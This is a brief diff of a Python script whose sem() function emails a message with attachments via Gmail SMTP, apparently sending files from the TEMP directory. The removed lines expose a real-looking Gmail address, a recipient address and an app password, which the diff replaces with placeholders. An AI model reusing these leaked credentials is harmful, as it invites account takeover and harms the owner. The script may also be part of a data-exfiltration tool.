@@ -13,8 +13,8 @@ from email import encoders
 temp_dir =os.environ['TEMP']
 
 def sem():  
-    fromaddr = "sanzg6286@gmail.com"
-    toaddr = "l20211847@tectijuana.edu.mx"
+    fromaddr = "@gmail.com"
+    toaddr = "@gmail"
        
     # instance of MIMEMultipart
     msg = MIMEMultipart()
@@ -60,7 +60,7 @@ def sem():
     s.starttls()
       
     # Authentication
-    s.login("sanzg6286@gmail.com", "slopkaghhurqqoxr")
+    s.login("@gmail.com", "password")
       
     # Converts the Multipart msg into a string
     text = msg.as_string()
